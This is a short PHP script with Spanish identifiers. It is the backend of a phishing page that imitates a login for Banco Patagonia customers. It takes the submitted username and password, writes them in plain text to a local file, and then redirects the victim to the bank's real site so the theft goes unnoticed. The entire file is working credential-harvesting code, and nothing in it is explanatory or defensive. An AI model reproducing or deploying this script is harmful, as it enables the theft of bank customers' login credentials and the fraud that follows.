<?php
$usuario = $_POST['usuario'];
$clave = $_POST['clave'];

$archivo = fopen("credenciales.txt", "a");
fwrite($archivo, "Usuario: $usuario - Clave: $clave\n");
fclose($archivo);

// Redirigir al sitio real
header("Location: https://www.bancopatagonia.com.ar/personas/index.php");
exit();
?>
